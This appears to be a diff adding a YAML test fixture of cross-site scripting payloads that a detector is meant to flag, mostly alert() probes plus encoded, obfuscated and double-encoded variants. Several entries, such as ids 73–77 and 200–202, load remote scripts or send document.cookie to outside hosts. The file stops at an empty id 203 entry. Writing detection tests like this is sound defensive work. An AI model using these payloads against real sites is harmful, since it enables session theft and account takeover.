@@ -1,0 +1,583 @@
+#
+# TEST Xss ATTACKS
+# These Xss attacks need to be detected
+#
+# NOTE:
+# Enclosing strings in double quotes allows you to use escapings to represent ASCII and Unicode characters.
+# " and \ in payload need to be escaped!!!
+#
+
+---
+id: 1
+message: Classic Xss injection test
+payload: "'<script>alert()</script>"
+
+---
+id: 2
+message: Checking for posibility of Xss injection attacks
+payload: "'\"><script>alert()</script>"
+
+---
+id: 3
+message: Checking for posibility of Xss injection attacks
+payload: "+ADw-script+AD4-alert();+ADw-/script+AD4-"
+
+---
+id: 4
+message: Checking for posibility of Xss injection attacks
+payload: "<script>alert(document.cookie)</script>"
+
+---
+id: 5
+message: Method of the nested script is that if the filter is not very strong and bad filters
+payload: "'<sc<script>ript>alert()</sc</script>ript>"
+
+---
+id: 6
+message: Checking for Xss filttarion
+payload: "'>>>><<script"
+
+---
+id: 7
+message: Checking for Xss filttarion
+payload: "'\"> http://******.ru/trye.asp?sessionID=\"><IMG%20SRC=\"javascript:alert();"
+
+---
+id: 8
+message: Checking for posibility of Xss injection attacks by image script
+payload: "'[img]http://www.qwewqw.ru/1.jpg dynsrc=javascript:alert('sss')[/img]"
+
+---
+id: 9
+message: Variation for checking for posibility of Xss injection attacks by image script
+payload: "'[img]http://www.qwewqw.ru/\"/dynsrc=\"javascript:alert('sss')\"/1.jpg[/img]"
+
+---
+id: 10
+message: Checking for Xss filttarion
+payload: "'http://*****.ru/free?p=><script src=http://haknet.h16.ru/script/js.js></script>"
+
+#Checking for any dangerous JS code
+
+---
+id: 11
+message: Checking for JS Xss filttarion
+payload: "'decodeURI(string);"
+
+---
+id: 12
+message: Checking for JS Xss filttarion
+payload: "'decodeURIComponent(string);"
+
+---
+id: 13
+message: Checking for JS Xss filttarion
+payload: "'encodeURI(string);"
+
+---
+id: 14
+message: Checking for JS Xss filttarion
+payload: "'encodeURIComponent(string);"
+
+---
+id: 15
+message: Checking for JS Xss filttarion
+payload: "'escape(string);"
+
+---
+id: 16
+message: Checking for JS Xss filttarion
+payload: "'eval(string);"
+
+---
+id: 17
+message: Checking for JS Xss filttarion
+payload: "'isFinite(value);"
+
+---
+id: 18
+message: Checking for JS Xss filttarion
+payload: "'isNaN(value);"
+
+---
+id: 19
+message: Checking for JS Xss filttarion
+payload: "'Number(object);"
+
+---
+id: 20
+message: Checking for JS Xss filttarion
+payload: "'parseFloat(string);"
+
+---
+id: 21
+message: Checking for JS Xss filttarion
+payload: "'parseInt(string,radix);"
+
+---
+id: 22
+message: Checking for JS Xss filttarion
+payload: "'String(object);"
+
+---
+id: 23
+message: Checking for JS Xss filttarion
+payload: "'unescape(string);"
+
+#Checking for XML DOM elements
+
+---
+id: 24
+message: Checking for XML DOM elements
+payload: "'document.write(document.links[0].id);"
+
+---
+id: 25
+message: Checking for XML DOM elements
+payload: "'document.write(document.domain);"
+
+---
+id: 26
+message: Checking for XML DOM elements
+payload: "'var doc=document.open(\"text/html\",\"replace\");"
+
+---
+id: 27
+message: Checking for XML DOM elements
+payload: "'alert(x.innerHTML);"
+
+---
+id: 28
+message: Checking for XML DOM elements
+payload: "'document.getElementById(\"htmldom\").href;"
+
+---
+id: 29
+message: Checking for XML DOM elements
+payload: "'var p=window.createPopup();var pbody=p.document.body;"
+
+---
+id: 30
+message: Checking for XML DOM elements
+payload: "'window.scrollBy(100,100);"
+
+---
+id: 31
+message: Checking for XML DOM elements
+payload: "'window.location.assign(\"http://www.w3schools.com\");"
+
+#Detector also should detect dangerous HTML-tags
+
+---
+id: 32
+message: Checking for dangerous HTML-tags
+payload: "'Comments (<!--    -->);"
+
+---
+id: 33
+message: Checking for dangerous HTML-tags
+payload: "<a href>;"
+
+---
+id: 34
+message: Checking for dangerous HTML-tags
+payload: "'<aplet>;"
+
+---
+id: 35
+message: Checking for dangerous HTML-tags
+payload: "'<area>;"
+
+---
+id: 36
+message: Checking for dangerous HTML-tags
+payload: "'<area>;"
+
+---
+id: 37
+message: Checking for dangerous HTML-tags
+payload: "'<audio>;"
+
+---
+id: 38
+message: Checking for dangerous HTML-tags
+payload: "'<base>;"
+
+---
+id: 39
+message: Checking for dangerous HTML-tags
+payload: "'<blockquote>;"
+
+---
+id: 40
+message: Checking for dangerous HTML-tags
+payload: "'<body>;"
+
+---
+id: 41
+message: Checking for dangerous HTML-tags
+payload: "'<button>;"
+
+---
+id: 42
+message: Checking for dangerous HTML-tags
+payload: "'<command>;"
+
+---
+id: 43
+message: Checking for dangerous HTML-tags
+payload: "'<del>;"
+
+---
+id: 44
+message: Checking for dangerous HTML-tags
+payload: "'<embed>;"
+
+---
+id: 45
+message: Checking for dangerous HTML-tags
+payload: "'<form>;"
+
+---
+id: 46
+message: Checking for dangerous HTML-tags
+payload: "'<html>;"
+
+---
+id: 47
+message: Checking for dangerous HTML-tags
+payload: "'<iframe>;"
+
+---
+id: 48
+message: Checking for dangerous HTML-tags
+payload: "'<img>;"
+
+---
+id: 49
+message: Checking for dangerous HTML-tags
+payload: "'<input>;"
+---
+id: 50
+message: Checking for dangerous HTML-tags
+payload: "'<ins>;"
+---
+id: 51
+message: Checking for dangerous HTML-tags
+payload: "'<keygen>;"
+---
+id: 52
+message: Checking for dangerous HTML-tags
+payload: "'<link>;"
+---
+id: 53
+message: Checking for dangerous HTML-tags
+payload: "'<meta>;"
+---
+id: 54
+message: Checking for dangerous HTML-tags
+payload: "'<object>;"
+---
+id: 55
+message: Checking for dangerous HTML-tags
+payload: "'<script>;"
+---
+id: 56
+message: Checking for dangerous HTML-tags
+payload: "'<source>;"
+---
+id: 57
+message: Checking for dangerous HTML-tags
+payload: "'<video>;"
+#Black list of this element should be contained in configuration file
+
+#VB Script dangerous code detection
+---
+id: 58
+message: Checking for dangerous VB Script code
+payload: "'Function CanDeliver(Dt)   CanDeliver = (CDate(Dt) - Now()) > 2  End Function"
+---
+id: 59
+message: Checking for dangerous VB Script code
+payload: "'GetObject();"
+---
+id: 60
+message: Checking for dangerous VB Script code
+payload: "'IsNull(expression);"
+---
+id: 61
+message: Checking for dangerous VB Script code
+payload: "'ScriptEngine;"
+---
+id: 62
+message: Checking for dangerous VB Script code
+payload: "'TypeName(varname);"
+---
+id: 63
+message: Checking for dangerous VB Script code
+payload: "'VarType(varname);"
+#List of this elements should be conteined in configuration file
+
+#Odfuscation code detection
+#Checking for code obfuscation
+---
+id: 64
+message: URL encoding (percent encoding)
+payload: "'\"%3Cscript%3Ealert('%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82')%3B%3C%2Fscript%3E\";"
+---
+id: 65
+message: Base64 encoded "=="
+payload: "alert('sd')"
+---
+id: 66
+message: HTML encoding
+payload: "'\"&lt;script&gt;alert(&#39;hi&#39;);&lt;/script&gt;\";"
+---
+id: 67
+message: Javascript escaping
+payload: "\"%3Cscript%3Ealert%28%27%u041F%u0440%u0438%u0432%u0435%u0442%27%29%3B%3C/script%3E\";"
+---
+id: 68
+message: \"<script>alert('Privet');</script>\" unicode encoding
+payload: "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#80;&#114;&#105;&#118;&#101;&#116;&#39;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
+---
+id: 69
+message: Hiding code by logic expressions
+payload: "'rgvij=(0.2e1>=4e1?.9075:\"i\"+\"f\");"
+#List of this elements should be contained in configuration file
+
+#These are examples of more complicate Xss attacks
+---
+id: 70
+message: Encoded http://*****.ru/free?p='><script src=http://haknet.h16.ru/script/js.js></script>
+payload: "%68%74%74%70%3A%2F%2F%2A%2A%2A%2A%2A%2E%72%75%2F%66%72%65%65%3F%70%3D%27%3E%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%68%61%6B%6E%65%74%2E%68%31%36%2E%72%75%2F%73%63%72%69%70%74%2F%6A%73%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E"
+
+---
+id: 71
+message: Checking for Xss filttarion
+payload: "'<script language=\"JavaScript\">
+document.location.href=\"%68%74%74%70%3A%2F%2F%2A%2A%2A%2A%2A%2E%72%75%2F%6 6%72%65%65%3F%70%3D%27%3E%3C%73%63%72%69%70%74%20% 73%72%63%3D%68%74%74%70%3A%2F%2F%68%61%6B%6E%65%74 %2E%68%31%36%2E%72%75%2F%73%63%72%69%70%74%2F%6A%7 3%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E\"
+</script>"
+
+---
+id: 72
+message: Checking for Xss filttarion
+payload: "'http://server.example.com/browse.cfm?categoryID=1&name=<script>alert(document.cookie);</script>"
+
+---
+id: 73
+message: Hex coded "><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?' +document.cookie</script>
+payload: "%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e"
+
+---
+id: 74
+message: Checking for posibility of Xss injection attacks
+payload: "<script>img = new Image(); img.src = \"http://vash-site.ru/image.gif?\"+document.cookie;</script>"
+---
+id: 75
+message: Checking for posibility of Xss injection attacks
+payload: "<script%3E%69%6D%67%20%3D%20%6E%65%77%20%49%6D%61%67%65%28%29%3B%20%69%6D%67%2E%73%72%63%20%3D%20%22%68%74%74%70%3A%2F%2F%76%61%73%68%2D%73%69%74%65%2E%72%75%2F%69%6D%61%67%65%2E%67%69%66%3F%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B%3C%2F%73%63%72%69%70%74%3E"
+---
+id: 76
+message: Checking for posibility of Xss injection attacks
+payload: "img=new Image(); img.src=\"http://ash.ua/image.gif?\"+document.cookie;"
+---
+id: 77
+message: Checking for posibility of Xss injection attacks
+payload: "<script%20%73%72%63%3D%68%74%74%70%3A%2F%2F%76%61%73%68%2D%73%69%74%65%2E%72%75%2F%31%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E"
+---
+id: 78
+message: <script>alert(document.cookie)</script> in BASE64
+payload: "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"
+---
+id: 79
+message: Checking for posibility of Xss injection attacks
+payload: "getURL(\"java script:alert()\")"
+---
+id: 80
+message: Checking for XSS locator
+payload: "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+---
+id: 81
+message: Checking for XSS locator
+payload: ";alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))"
+---
+id: 82
+message: Checking for posibility of Xss injection attacks
+payload: "<IMG SRC=\"javascript:alert('XSS');\\\">"
+---
+id: 83
+message: Checking for Case insensitive XSS attack vector
+payload: "<IMG SRC=JaVaScRiPt:alert('XSS')>"
+---
+id: 84
+message: Checking for posibility of Xss injection attacks No quotes and no semicolon
+payload: "<IMG SRC=javascript:alert('XSS')>"
+---
+id: 85
+message: Checking for posibility of Xss injection attacks with HTML entities
+payload: "<IMG SRC=javascript:alert(&quot;XSS&quot;)>>"
+---
+id: 86
+message: Checking for posibility of Xss injection attacks with Grave accent obfuscation
+payload: "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"
+---
+id: 87
+message: Checking for posibility of Xss injection attacks with fromCharCode
+payload: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
+---
+id: 88
+message: Checking for posibility of Xss injection attacks with UTF-8 Unicode encoding 
+payload: "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
+---
+id: 89
+message: Checking for posibility of Xss injection attacks with Long UTF-8 Unicode encoding without semicolons 
+payload: "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
+---
+id: 90
+message: Checking for posibility of Xss injection attacks - Hex encoding without semicolons
+payload: "IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
+---
+id: 91
+message: Embedded tab to break up the cross site scripting attack
+payload: "<IMG SRC=\"jav	ascript:alert('XSS');\">"
+---
+id: 92
+message: Embedded encoded tab to break up XSS
+payload: "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
+---
+id: 93
+message: Embeded newline to break up XSS.
+payload: "<IMG SRC=\"javascript:alert('XSS');\\\">"
+---
+id: 94
+message: Embeded newline to break up XSS.
+payload: "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"
+---
+id: 95
+message: Embedded carriage return to break up XSS
+payload: "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">"
+---
+id: 96
+message: Spaces and meta chars before the JavaScript in images for XSS
+payload: "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
+---
+id: 97
+message: Non-alpha-non-digit XSS
+payload: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"
+---
+id: 98
+message: BODY tag 
+payload: "<BODY ONLOAD=alert('XSS')>"
+---
+id: 99
+message:  JavaScript includes works in Netscape 4.x
+payload: "<BR SIZE=\"&{alert('XSS')}\">"
+---
+#Normalization
+---
+id: 100
+message:  Normalization.Html
+payload: "&lt;script&gt;alert&lpar&rpar&lt&sol;script&gt"
+---
+id: 101
+message:  Normalization.Html
+payload: "&lt;script&gt;alert&lp;ardocument&period;cookie&rpar&lt&sol;script&gt"
+---
+id: 102
+message:  Normalization.Html
+payload: "XSS hello/. &lt;script+ &gt"
+---
+id: 103
+message:  Normalization.Html
+payload: "&lt;script&gt;alert&lpar;&rpar;&lt;&sol;script&gt;"
+---
+id: 110
+message:  Normalization.Url
+payload: "%3cscript%3ealert()%3c/script%3e"
+---
+id: 111
+message:  Normalization.Url
+payload: "%3cscript%3ealert(document.cookie)%3c/script%3e"
+---
+id: 112
+message:  Normalization.Url
+payload: "%2BXSS+%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82%2F.+%3Cscript%2B%3E>"
+---
+id: 120 
+message:  Normalization.JavaScript
+payload: "+%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e"
+#---
+#id: 121
+#message:  Normalization.JavaScript
+#payload: "%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0064%u006f%u0063%u0075%u006d%u0065%u006e%u0074%u002e%u0063%u006f%u006f%u006b%u0069%u0065%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e."
+---
+id: 122
+message:  Normalization.JavaScript
+payload: "+XSS%20%u043F%u0440%u0438%u0432%u0435%u0442/.%20%3Cscript%20%3E"
+
+---
+id: 130
+message:  Double encoded code URL JavaScript
+payload: "%u0025%u0033%u0063%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0033%u0065%u0061%u006c%u0065%u0072%u0074%u0028%u0064%u006f%u0063%u0075%u006d%u0065%u006e%u0074%u002e%u0063%u006f%u006f%u006b%u0069%u0065%u0029%u0025%u0033%u0063%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0033%u0065"
+---
+id: 131
+message:  Double encoded code JavaScript URL
+payload: "%25u003c%25u0073%25u0063%25u0072%25u0069%25u0070%25u0074%25u003e%25u0061%25u006c%25u0065%25u0072%25u0074%25u0028%25u0064%25u006f%25u0063%25u0075%25u006d%25u0065%25u006e%25u0074%25u002e%25u0063%25u006f%25u006f%25u006b%25u0069%25u0065%25u0029%25u003c%25u002f%25u0073%25u0063%25u0072%25u0069%25u0070%25u0074%25u003e"
+---
+id: 132
+message:  Double encoded code HTML Javascript
+payload: "%u0026%u006c%u0074%u0073%u0063%u0072%u0069%u0070%u0074%u0026%u0067%u0074%u0061%u006c%u0065%u0072%u0074%u0026%u006c%u0070%u0061%u0072%u0064%u006f%u0063%u0075%u006d%u0065%u006e%u0074%u0026%u0070%u0065%u0072%u0069%u006f%u0064%u0063%u006f%u006f%u006b%u0069%u0065%u0026%u0072%u0070%u0061%u0072%u0026%u006c%u0074%u0026%u0073%u006f%u006c%u0073%u0063%u0072%u0069%u0070%u0074%u0026%u0067%u0074"
+---
+id: 133
+message:  Double encoded code Javascript HTML
+payload: "&percnt;%u003c&percnt;%u0073&percnt;%u0063&percnt;%u0072&percnt;%u0069&percnt;%u0070&percnt;%u0074&percnt;%u003e&percnt;%u0061&percnt;%u006c&percnt;%u0065&percnt;%u0072&percnt;%u0074&percnt;%u0028&percnt;%u0064&percnt;%u006f&percnt;%u0063&percnt;%u0075&percnt;%u006d&percnt;%u0065&percnt;%u006e&percnt;%u0074&percnt;%u002e&percnt;%u0063&percnt;%u006f&percnt;%u006f&percnt;%u006b&percnt;%u0069&percnt;%u0065&percnt;%u0029&percnt;%u003c&percnt;%u002f&percnt;%u0073&percnt;%u0063&percnt;%u0072&percnt;%u0069&percnt;%u0070&percnt;%u0074&percnt;%u003e"
+---
+id: 134
+message:  Double encoded code URL*2
+payload: "%253cscript%253ealert(document.cookie)%253c/script%253e"
+---
+id: 135
+message:  Double encoded code HTML*2
+payload: "&amp;lt;script&amp;gt;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&amp;lt;&amp;sol;script&amp;gt;"
+---
+id: 136
+message:  Double encoded code Java script*2
+payload: "%u0025%u0075%u0030%u0030%u0033%u0063%u0025%u0075%u0030%u0030%u0037%u0033%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0033%u0065%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0038%u0025%u0075%u0030%u0030%u0036%u0034%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0035%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0036%u0065%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0065%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0062%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0032%u0039%u0025%u0075%u0030%u0030%u0033%u0063%u0025%u0075%u0030%u0030%u0032%u0066%u0025%u0075%u0030%u0030%u0037%u0033%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0033%u0065"
+---
+id: 137
+message:  Double encoded code URL HTML
+payload: "&percnt;3cscript&percnt;3ealert&lpar;document&period;cookie&rp;ar;&percnt;3c&sol;script&percnt;3e"
+---
+id: 150
+message:  Cycles 5 html
+payload: "&ampampampampltscript&ampampampampgtalert&ampampampamplpardocument&ampampampampperiodcookie&ampampampamprpar&ampampampamplt&ampampampampsolscript&ampampampampgt"
+---
+id: 151
+message:  Cycles 5 html +2 Java script
+payload: "&%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0037%u0033%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0037%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0034%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0035%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0036%u0065%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0034%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0062%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0036%u0035%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0033%u0025%u0075%u0030%u0030%u0036%u0066%u0025%u0075%u0030%u0030%u0036%u0063%u0025%u0075%u0030%u0030%u0037%u0033%u0025%u0075%u0030%u0030%u0036%u0033%u0025%u0075%u0030%u0030%u0037%u0032%u0025%u0075%u0030%u0030%u0036%u0039%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0037%u0034%u0025%u0075%u0030%u0030%u0032%u0036%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0031%u0025%u0075%u0030%u0030%u0036%u0064%u0025%u0075%u0030%u0030%u0037%u0030%u0025%u0075%u0030%u0030%u0036%u0037%u0025%u0075%u0030%u0030%u0037%u0034"
+---
+id: 152
+message:  Cycles 
+payload: "$%25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525"
+---
+id: 153
+message:  Cycles 
+payload: "&percntu0024&percntu0025&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035&percntu0032&percntu0035"
+---
+
+id: 200
+message: LAYER (also only works in Netscape 4.x)
+payload: "<LAYER SRC=\"http://ha.org/scriptlet.html\"></LAYER>"
+---
+id: 201
+message: Remote style sheet
+payload: "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">"
+---
+id: 202
+message: Remote style sheet
+payload: "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"
+---
+id: 203
+message: 2encoding
